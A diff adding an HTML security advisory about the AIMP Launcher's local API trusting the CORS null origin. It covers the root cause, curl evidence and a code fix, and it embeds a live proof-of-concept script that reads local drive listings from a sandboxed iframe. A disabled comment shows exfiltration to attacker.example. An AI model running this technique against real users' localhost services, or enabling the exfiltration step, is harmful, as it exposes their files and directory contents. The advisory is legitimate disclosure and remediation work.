@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>AIMP Launcher — null-origin CORS vulnerability</title>
+<style>
+  :root {
+    --bg:#0d1117; --panel:#161b22; --border:#30363d; --text:#e6edf3;
+    --muted:#9198a1; --accent:#7c9cff; --danger:#ff6b81; --ok:#56d364; --warn:#e3b341;
+    --code:#0b0f16;
+  }
+  * { box-sizing: border-box; }
+  body { margin:0; background:var(--bg); color:var(--text);
+         font:16px/1.65 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif; }
+  .layout { display:grid; grid-template-columns:240px 1fr; max-width:1200px; margin:0 auto; }
+  nav { position:sticky; top:0; align-self:start; height:100vh; overflow:auto;
+        padding:1.5rem 1rem; border-right:1px solid var(--border); }
+  nav h2 { font-size:.8rem; text-transform:uppercase; letter-spacing:.08em; color:var(--muted); }
+  nav a { display:block; color:var(--text); text-decoration:none; padding:.3rem 0; font-size:.92rem; }
+  nav a:hover { color:var(--accent); }
+  main { padding:2.5rem 2.5rem 6rem; min-width:0; }
+  h1 { font-size:1.9rem; line-height:1.2; margin:0 0 .4rem; }
+  h2 { font-size:1.35rem; margin:2.4rem 0 .8rem; padding-bottom:.3rem; border-bottom:1px solid var(--border); scroll-margin-top:1rem; }
+  h3 { font-size:1.05rem; margin:1.6rem 0 .5rem; }
+  p,li { color:var(--text); }
+  code { background:var(--code); padding:.12em .4em; border-radius:4px; font-size:.88em;
+         font-family:"SF Mono",Consolas,Menlo,monospace; color:#ffd479; }
+  pre { background:var(--code); border:1px solid var(--border); border-radius:8px;
+        padding:1rem 1.1rem; overflow:auto; }
+  pre code { background:none; padding:0; color:#d7e0ea; }
+  .sub { color:var(--muted); margin:.1rem 0 1.4rem; }
+  .pills { display:flex; flex-wrap:wrap; gap:.5rem; margin:1rem 0 0; }
+  .pill { font-size:.8rem; border:1px solid var(--border); border-radius:999px;
+          padding:.25rem .7rem; color:var(--muted); background:var(--panel); }
+  .pill b { color:var(--text); }
+  .card { background:var(--panel); border:1px solid var(--border); border-radius:10px;
+          padding:1rem 1.2rem; margin:1rem 0; }
+  .sev { border-left:4px solid var(--warn); }
+  .danger { color:var(--danger); font-weight:700; }
+  .ok { color:var(--ok); font-weight:700; }
+  .warn { color:var(--warn); font-weight:700; }
+  table { border-collapse:collapse; width:100%; margin:1rem 0; font-size:.93rem; }
+  th,td { border:1px solid var(--border); padding:.55rem .7rem; text-align:left; vertical-align:top; }
+  th { background:var(--panel); }
+  .add { color:var(--ok); } .del { color:var(--danger); }
+  .flow { background:var(--code); border:1px solid var(--border); border-radius:8px;
+          padding:1.2rem; overflow:auto; font-family:"SF Mono",Consolas,monospace; font-size:.82rem; color:#cdd9e5; white-space:pre; }
+  footer { color:var(--muted); font-size:.85rem; margin-top:3rem; padding-top:1rem; border-top:1px solid var(--border); }
+  .kbd { background:var(--panel); border:1px solid var(--border); border-bottom-width:2px;
+         border-radius:5px; padding:.05em .4em; font-size:.85em; }
+  .live { background:#141a2e; border:1px solid #39407a; border-radius:10px; padding:1.2rem 1.3rem; margin:1.1rem 0; }
+  .live label { font-size:.92rem; color:var(--muted); }
+  .live input { background:var(--code); color:var(--text); border:1px solid var(--border);
+                border-radius:6px; padding:.4rem .6rem; font:inherit; font-size:.9rem; width:230px; }
+  .live button { font:inherit; padding:.45rem 1rem; border:1px solid #5a6bd8; border-radius:6px;
+                 background:#2b3a8c; color:#fff; cursor:pointer; }
+  .live button:hover { background:#36459e; }
+  .live .status { font-size:1.05rem; margin:1rem 0 .6rem; }
+  .live pre { max-height:300px; margin:.4rem 0 0; }
+  @media (max-width:820px){ .layout{grid-template-columns:1fr;} nav{position:static;height:auto;border-right:none;border-bottom:1px solid var(--border);} }
+</style>
+</head>
+<body>
+<div class="layout">
+  <nav>
+    <h2>Contents</h2>
+    <a href="#summary">Summary</a>
+    <a href="#affected">Affected component</a>
+    <a href="#root-cause">Root cause</a>
+    <a href="#why">Why the browser normally blocks this</a>
+    <a href="#scenario">Attack scenario</a>
+    <a href="#evidence">Evidence</a>
+    <a href="#pna">Private Network Access nuance</a>
+    <a href="#impact">Impact &amp; severity</a>
+    <a href="#repro">Reproduction</a>
+    <a href="#live">Test it yourself (live)</a>
+    <a href="#fix">The fix</a>
+    <a href="#remediation">Remediation</a>
+    <a href="#disclosure">Disclosure</a>
+  </nav>
+
+  <main>
+    <h1>AIMP Launcher — the local API trusts the <code>null</code> CORS origin</h1>
+    <p class="sub">A drive-by web page can read the local machine's drives and directories through the launcher's loopback API while it is running.</p>
+    <div class="pills">
+      <span class="pill">Component: <b>AIMP.Launcher</b></span>
+      <span class="pill">Class: <b>CORS misconfiguration (CWE-942 / CWE-346)</b></span>
+      <span class="pill">Vector: <b>Drive-by browser, no auth</b></span>
+      <span class="pill">Status: <b>Confirmed, fix available</b></span>
+    </div>
+
+    <h2 id="summary">Summary</h2>
+    <p>The AIMP Launcher runs a local HTTP API (default <code>http://127.0.0.1:5127</code>) that
+    browses the filesystem and controls the game (validate / launch / inject / shutdown). Access is
+    meant to be limited to the AIMP frontend by a CORS origin allow-list
+    (<code>IsLocalFrontendOrigin</code> in <code>Program.cs</code>). That allow-list
+    <strong>unconditionally trusted the opaque <code>null</code> origin</strong>:</p>
+<pre><code>if (string.Equals(origin, "null", StringComparison.OrdinalIgnoreCase)) return true;</code></pre>
+    <p>Browsers send <code>Origin: null</code> from sandboxed <code>&lt;iframe&gt;</code> elements and
+    <code>data:</code> URLs. Any web page a user visits can create such a context, so while the
+    launcher is running, <strong>an arbitrary website can read responses from the local API</strong> —
+    a classic drive-by exposure of a localhost service.</p>
+
+    <h2 id="affected">Affected component</h2>
+    <table>
+      <tr><th>Item</th><th>Detail</th></tr>
+      <tr><td>Service</td><td>AIMP Launcher local API (Kestrel / ASP.NET Core)</td></tr>
+      <tr><td>Endpoint</td><td><code>http://127.0.0.1:5127</code> (loopback only)</td></tr>
+      <tr><td>File</td><td><code>AIMP.Launcher/src/AIMP.Launcher/Program.cs</code> — <code>IsLocalFrontendOrigin</code> and the Private Network Access preflight in <code>ConfigurePipeline</code></td></tr>
+      <tr><td>Example data exposed</td><td><code>GET /api/v1/filesystem/drives</code>, <code>GET /api/v1/filesystem/directory?path=…</code></td></tr>
+    </table>
+
+    <h2 id="root-cause">Root cause</h2>
+    <p>CORS is supposed to be the gate that keeps other web origins from reading this API. The gate
+    special-cased the string <code>"null"</code> and returned <em>allowed</em>. But <code>null</code>
+    is not a trustworthy identity — it is the <em>opaque</em> origin shared by:</p>
+    <ul>
+      <li>sandboxed iframes (<code>&lt;iframe sandbox="allow-scripts"&gt;</code>),</li>
+      <li><code>data:</code> documents,</li>
+      <li>some cross-origin redirect chains.</li>
+    </ul>
+    <p>An attacker's page can <em>deliberately</em> put its own request into a <code>null</code>-origin
+    context, so "allow <code>null</code>" effectively means "allow anyone who asks."</p>
+
+    <h2 id="why">Why the browser normally blocks this</h2>
+    <p>When a page on <code>https://attacker.example</code> runs
+    <code>fetch("http://127.0.0.1:5127/…")</code>, the browser <em>sends</em> the request (sending to
+    loopback is allowed) but then checks CORS before letting the page <strong>read the response</strong>.
+    Normally the launcher would not return an <code>Access-Control-Allow-Origin</code> matching the
+    attacker, so the browser discards the body and the attacker learns nothing.</p>
+    <p>The bug defeats that: the launcher answers <code>Access-Control-Allow-Origin: null</code>, and a
+    page can make its own origin <code>null</code> via a sandboxed iframe — so the browser hands the
+    response back.</p>
+
+    <h2 id="scenario">Attack scenario</h2>
+    <p>The attacker never touches the victim's machine directly. The API is loopback-only and cannot be
+    reached from the network. Instead the attacker makes the <em>victim's own browser</em> be the bridge:
+    <code>127.0.0.1</code> in the victim's browser is the victim's machine.</p>
+    <div class="flow">Attacker-controlled web page            Victim's browser                 Victim's machine
+(attacker.example / an ad /   ──►  runs attacker JS in a     ──►  AIMP Launcher API
+ a compromised site)               sandboxed (null) iframe        127.0.0.1:5127
+
+          │                                │                            │
+          │  1. victim visits page         │                            │
+          │ ─────────────────────────────► │                            │
+          │                                │  2. fetch() to 127.0.0.1   │
+          │                                │ ─────────────────────────► │
+          │                                │                            │  3. returns drive /
+          │                                │  4. ACAO: null → readable  │     directory listing
+          │                                │ ◄───────────────────────── │
+          │  5. POST stolen data           │                            │
+          │ ◄───────────────────────────── │                            │
+          ▼
+   attacker's server                                                    </div>
+    <p>Requirements for the attacker: <strong>(1)</strong> the launcher is running, and
+    <strong>(2)</strong> the victim loads attacker-controlled JavaScript in a browser (a malicious link,
+    a malvertising iframe, or an XSS/compromised site). No local code execution, no control of the
+    victim's IP, and no takeover of any AIMP domain is required.</p>
+
+    <h2 id="evidence">Evidence</h2>
+    <h3>1. The server explicitly blesses the <code>null</code> origin (and the private-network bypass)</h3>
+    <p>Replaying the browser's preflight with <code>curl</code>:</p>
+<pre><code>$ curl -i -X OPTIONS http://127.0.0.1:5127/api/v1/filesystem/drives \
+     -H "Origin: null" \
+     -H "Access-Control-Request-Method: GET" \
+     -H "Access-Control-Request-Private-Network: true"
+
+HTTP/1.1 204 No Content
+Server: Kestrel
+Access-Control-Allow-Methods: GET
+Access-Control-Allow-Origin: null                 <-- trusts the opaque origin
+Vary: Origin
+Access-Control-Allow-Private-Network: true        <-- green-lights public -> local</code></pre>
+    <p>By contrast, a genuine remote origin is correctly refused (no
+    <code>Access-Control-Allow-Origin</code> header is returned):</p>
+<pre><code>$ curl -i http://127.0.0.1:5127/api/v1/filesystem/drives -H "Origin: https://evil.example"
+HTTP/1.1 200 OK
+(no Access-Control-Allow-Origin)</code></pre>
+
+    <h3>2. A sandboxed, cross-origin page reads the local drives in a real browser</h3>
+    <p>A page served from a different origin, running its request inside a
+    <code>sandbox="allow-scripts"</code> iframe (origin <code>null</code>), successfully read the
+    machine's drive list in Google Chrome:</p>
+<pre><code>🔓 VULNERABLE — this untrusted page just read your local drives:
+
+[{"id":"C:\\","name":"OS","path":"C:\\","type":"FIXED","available":true, ...},
+ {"id":"D:\\","name":"860 evo","path":"D:\\","type":"FIXED", ...},
+ {"id":"E:\\","name":"My Passport","path":"E:\\","type":"FIXED", ...},
+ {"id":"F:\\","name":"F:\\","path":"F:\\","type":"CDROM", ...}]</code></pre>
+    <p class="sub">Drive labels, types and byte counts are returned verbatim. The same technique applies
+    to <code>…/filesystem/directory?path=C:\Users\&lt;name&gt;</code> to walk folders.</p>
+
+    <h2 id="pna">Private Network Access nuance</h2>
+    <p>Modern Chromium has a <em>Private Network Access</em> (PNA) protection that gates requests from a
+    <em>public</em> site to a <em>private</em> address such as <code>127.0.0.1</code>. This affects
+    exploitability but does not make the launcher safe:</p>
+    <ul>
+      <li>When the request's initiator is itself local (e.g. the demo served from
+      <code>127.0.0.1:8080</code>), PNA does not apply and the read succeeds outright.</li>
+      <li>For a truly public attacker page, Chromium issues a PNA preflight — which the launcher
+      <strong>answers with <code>Access-Control-Allow-Private-Network: true</code> for the
+      <code>null</code> origin</strong> (see Evidence #1), i.e. it actively permits the bypass.</li>
+      <li>Enforcement varies by browser and version. Firefox does not implement PNA the same way, and
+      older Chromium builds do not block it at all.</li>
+    </ul>
+    <p class="warn">A browser-side safeguard is not a substitute for the server not trusting
+    <code>null</code> in the first place.</p>
+
+    <h2 id="impact">Impact &amp; severity</h2>
+    <div class="card sev">
+      <p style="margin:.2rem 0"><strong>Confidentiality:</strong> an untrusted web page can enumerate
+      drives and directory contents on the victim's machine and exfiltrate them — no authentication,
+      no user interaction beyond visiting a page.</p>
+      <p style="margin:.6rem 0 .2rem"><strong>Integrity/availability:</strong> state-changing endpoints
+      (<code>launch</code>, <code>inject</code>, <code>shutdown</code>) are also reachable cross-origin;
+      impact varies as some require a valid game directory, but they should never be callable from an
+      arbitrary web origin.</p>
+    </div>
+    <p>Preconditions that bound the risk: the launcher must be running, and the victim must load the
+    attacker's JavaScript in a browser whose PNA policy allows the request.</p>
+
+    <h2 id="repro">Reproduction</h2>
+    <ol>
+      <li>Start the launcher so the API listens on <code>127.0.0.1:5127</code>.</li>
+      <li>Serve a proof-of-concept page from any other origin, e.g.
+      <code>python -m http.server 8080</code>.</li>
+      <li>Open the page in a browser and let it run a <code>fetch</code> to
+      <code>/api/v1/filesystem/drives</code> from inside a <code>sandbox="allow-scripts"</code> iframe.</li>
+      <li><strong>Vulnerable build:</strong> the drive listing is returned to the page.
+      <strong>Fixed build:</strong> the browser blocks the cross-origin read.</li>
+    </ol>
+    <p class="sub">A read-only PoC that never calls any state-changing endpoint is sufficient to
+    demonstrate the issue.</p>
+
+    <h2 id="live">Test it yourself (live, read-only)</h2>
+    <p>With the launcher running, the button below reproduces the exploit <em>from this very page</em>.
+    It runs its request inside a <code>sandbox="allow-scripts"</code> iframe, so the browser labels the
+    request's origin <code>null</code> — exactly the condition the vulnerability trusts. It only calls the
+    read-only <code>GET /api/v1/filesystem/drives</code> endpoint and <strong>sends the result
+    nowhere</strong> (the data stays in your browser; the exfiltration step is a disabled comment in the
+    source).</p>
+    <div class="card">
+      <strong>Before you click:</strong>
+      <ol style="margin:.5rem 0 0">
+        <li>Start the AIMP Launcher so its API is listening (default <code>127.0.0.1:5127</code>).</li>
+        <li>Open <em>this page</em> — the GitHub Pages URL is ideal, because that is a real remote
+        (public) origin, i.e. the true attacker position.</li>
+        <li>Click <span class="kbd">Run read-only probe</span>.</li>
+      </ol>
+    </div>
+    <div class="live">
+      <p>
+        <label>Launcher API base:
+          <input id="apiBase" value="http://127.0.0.1:5127" />
+        </label>
+        <button id="probe" type="button">Run read-only probe</button>
+      </p>
+      <p class="status" id="liveStatus">Idle — click the button with the launcher running.</p>
+      <pre><code id="liveOut">(no result yet)</code></pre>
+    </div>
+    <p class="sub"><span class="danger">🔓 VULNERABLE</span> = an untrusted <code>null</code>-origin page
+    read your local drives. <span class="ok">🔒 BLOCKED / REJECTED</span> = the request was refused
+    (fixed build, or a browser whose Private Network Access policy blocks it — see the note above). If a
+    hardened Chromium blocks it but you want to confirm the server side, try Firefox, or see the
+    <code>curl</code> evidence above which shows the launcher returning <code>Access-Control-Allow-Origin:
+    null</code> regardless of the browser.</p>
+
+    <h2 id="fix">The fix</h2>
+    <p>Stop trusting <code>null</code> by default. Accept only concrete local origins (loopback, the
+    <code>file:</code>/<code>app:</code> schemes, or one named by <code>AIMP_FRONTEND_ORIGIN</code>).
+    A packaged frontend whose engine reports <code>Origin: null</code> can opt back in explicitly with
+    an environment variable that is off unless deliberately set.</p>
+<pre><code><span class="del">-    private static bool IsLocalFrontendOrigin(string origin)</span>
+<span class="add">+    internal static bool IsLocalFrontendOrigin(string origin)</span>
+     {
+<span class="del">-        if (string.Equals(origin, "null", StringComparison.OrdinalIgnoreCase)) return true;</span>
+<span class="add">+        // The opaque "null" origin is NOT trusted by default. Browsers send</span>
+<span class="add">+        // Origin: null from sandboxed iframes, data: URLs and some redirect</span>
+<span class="add">+        // chains, so any web page could otherwise reach this loopback API while</span>
+<span class="add">+        // the launcher is running (a drive-by / CSRF read of the local machine).</span>
+<span class="add">+        if (string.Equals(origin, "null", StringComparison.OrdinalIgnoreCase))</span>
+<span class="add">+            return AllowsNullOrigin();</span>
+         if (!Uri.TryCreate(origin, UriKind.Absolute, out var uri)) return false;
+         if (uri.IsLoopback
+             || string.Equals(uri.Scheme, "file", StringComparison.OrdinalIgnoreCase)
+             || string.Equals(uri.Scheme, "app", StringComparison.OrdinalIgnoreCase))
+             return true;
+         /* …AIMP_FRONTEND_ORIGIN match unchanged… */
+     }
+<span class="add">+</span>
+<span class="add">+    private static bool AllowsNullOrigin()</span>
+<span class="add">+    {</span>
+<span class="add">+        var value = Environment.GetEnvironmentVariable("AIMP_ALLOW_NULL_ORIGIN")?.Trim();</span>
+<span class="add">+        return string.Equals(value, "1", StringComparison.Ordinal)</span>
+<span class="add">+            || string.Equals(value, "true", StringComparison.OrdinalIgnoreCase);</span>
+<span class="add">+    }</span></code></pre>
+    <p>A regression test (<code>CorsOriginTests</code>) asserts the gate accepts legitimate local
+    origins, rejects <code>null</code> and remote origins by default, and honors the opt-in.</p>
+
+    <h2 id="remediation">Remediation guidance</h2>
+    <ul>
+      <li><strong>Default-deny <code>null</code></strong> (the fix above).</li>
+      <li><strong>Frontend compatibility:</strong> if the UI loads over <code>file://</code> and relied
+      on the old behavior, migrate it to the already-whitelisted <code>app:</code> custom scheme, which
+      yields a stable, non-opaque origin — rather than leaving the <code>null</code> allowance on.</li>
+      <li><strong>Stronger follow-up (optional):</strong> for a localhost service the most robust defense
+      is a <em>shared launch token</em> — the launcher mints a random secret at startup, passes it to the
+      frontend it spawns, and requires it on every request. That removes reliance on the Origin header
+      entirely. It touches the separate frontend repo and is out of scope for the CORS fix.</li>
+    </ul>
+
+    <h2 id="disclosure">Disclosure</h2>
+    <p>This issue was identified during a source review, reproduced against a running launcher with a
+    read-only proof of concept, and reported to the project maintainer together with the fix above. The
+    proof of concept was limited to read-only endpoints and exfiltrated no data.</p>
+
+    <footer>
+      Security advisory — AIMP Launcher <code>null</code>-origin CORS. For the maintainer and
+      contributors. Details here are for defensive remediation.
+    </footer>
+  </main>
+</div>
+
+<script>
+  // Live, read-only proof of concept. Runs the fetch inside a sandboxed
+  // (opaque / null-origin) iframe so it reproduces the exact condition the
+  // vulnerability trusts. Calls only GET /api/v1/filesystem/drives and never
+  // transmits the result anywhere.
+  (function () {
+    var btn = document.getElementById('probe');
+    var statusEl = document.getElementById('liveStatus');
+    var out = document.getElementById('liveOut');
+    if (!btn) return;
+
+    btn.addEventListener('click', function () {
+      var base = document.getElementById('apiBase').value.trim().replace(/\/+$/, '');
+      statusEl.textContent = 'Probing ' + base + '/api/v1/filesystem/drives from a null-origin context…';
+      statusEl.className = 'status';
+      out.textContent = '(waiting)';
+
+      var iframe = document.createElement('iframe');
+      iframe.setAttribute('sandbox', 'allow-scripts'); // opaque origin => Origin: null
+      iframe.style.display = 'none';
+
+      var child =
+        '<script>' +
+        '(async () => {' +
+        '  try {' +
+        '    const r = await fetch(' + JSON.stringify(base) + ' + "/api/v1/filesystem/drives", { mode: "cors" });' +
+        '    const body = await r.text();' +
+        '    parent.postMessage({ ok: r.ok, status: r.status, body: body }, "*");' +
+        '  } catch (e) {' +
+        '    parent.postMessage({ ok: false, error: String(e) }, "*");' +
+        '  }' +
+        '})();' +
+        '<\/script>';
+
+      function onMessage(ev) {
+        if (ev.source !== iframe.contentWindow) return;
+        window.removeEventListener('message', onMessage);
+        var d = ev.data || {};
+        if (d.ok) {
+          statusEl.innerHTML = '🔓 <span class="danger">VULNERABLE</span> — this untrusted page just read your local drives (HTTP ' + d.status + '):';
+          out.textContent = d.body;
+          // EXFIL (disabled): a real attacker would do
+          //   fetch('https://attacker.example/collect', { method:'POST', body: d.body });
+        } else if (d.error) {
+          statusEl.innerHTML = '🔒 <span class="ok">BLOCKED</span> — the browser refused the cross-origin read (fixed build, or browser PNA).';
+          out.textContent = d.error;
+        } else {
+          statusEl.innerHTML = '🔒 <span class="ok">REJECTED</span> — the server refused the request (HTTP ' + d.status + ').';
+          out.textContent = d.body || '';
+        }
+        iframe.remove();
+      }
+
+      window.addEventListener('message', onMessage);
+      iframe.srcdoc = child;
+      document.body.appendChild(iframe);
+    });
+  })();
+</script>
+</body>
+</html>
